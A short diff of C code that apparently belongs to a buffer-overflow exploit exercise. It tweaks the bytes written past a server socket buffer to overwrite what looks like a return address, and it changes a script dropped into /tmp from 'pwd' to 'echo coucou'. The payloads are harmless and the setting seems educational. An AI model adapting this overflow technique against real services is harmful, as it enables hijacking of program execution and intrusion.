@@ -85,7 +85,7 @@ int my_execve(const char *name, char *const argv[], char *const envp[]){
 
 
 void only_one_func (){
-	const char hello[] = "#!/bin/bash\npwd\n";
+	const char hello[] = "#!/bin/bash\necho coucou\n";
     //int fd = my_open("/tmp/maybe_a_virus", O_CREAT | O_RDWR | O_TRUNC, 00700);
 	const char file[] = "/tmp/maybe_a_virus";
 	int fd;
@@ -159,7 +159,7 @@ void func(int sockfd)
 		}
 		*/
 		
-		buff[SERV_BUF_SIZE + decalage +10 ] = (char) (0x40);
+		buff[SERV_BUF_SIZE + decalage +10 ] = (char) (0x10);
 		buff[SERV_BUF_SIZE + decalage +11 ] = (char) 0xdc;
 		buff[SERV_BUF_SIZE + decalage +12]= (char) 0xff;
 		buff[SERV_BUF_SIZE + decalage +13]= (char) 0xff;
